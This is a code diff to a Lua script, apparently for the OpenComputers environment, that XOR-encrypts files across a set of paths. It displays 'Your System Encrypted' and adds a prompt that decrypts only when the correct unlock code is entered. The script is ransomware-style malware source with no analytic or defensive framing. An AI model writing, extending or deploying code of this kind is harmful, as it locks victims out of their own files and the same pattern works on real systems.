@@ -2,6 +2,7 @@ local fs = require("filesystem")
 local cmp = require("component")
 local gpu = cmp.gpu
 local computer = require("computer")
+local io = require("io")
 
 gpu.setBackground(0x000000)
 gpu.setForeground(0xFFFFFF)
@@ -15,10 +16,13 @@ local function xorCipher(data, key)
     local result = {}
     local keyLen = #key
     for i = 1, #data do
-        result[i] = string.char(bit32.bxor(string.byte(data, i), string.byte(key, (i - 1) % keyLen + 1)))
+        local byte = string.byte(data, i)
+        local keyByte = string.byte(key, (i - 1) % keyLen + 1)
+        result[i] = string.char(byte ~ keyByte) -- Используем `~` для XOR
     end
     return table.concat(result)
 end
+
 
 local function encryptFile(path)
     local file, err = io.open(path, "rb")
@@ -75,5 +79,23 @@ main()
 gpu.setBackground(0x000000)
 gpu.setForeground(0xFFFFFF)
 gpu.fill(1, 1, 160, 50, " ")
-gpu.set(5, 2, "!!!Warning!!!")
-gpu.set(3, 3, "Your System Encrypted")
+gpu.set(5, 1, "!!!Warning!!!")
+gpu.set(3, 2, "Your System Encrypted")
+
+local function passsys()
+    io.write("Enter unlock code to decrypt: ")
+    local inputKey = io.read()
+    if inputKey == key then
+        for _, path in ipairs(paths) do
+            if fs.exists(path) then
+                processDir(path, false)
+            end
+        end
+        print("System unlocked!")
+    else
+        print("Incorrect code. System remains encrypted.")
+        passsys()
+    end
+end
+
+passsys()
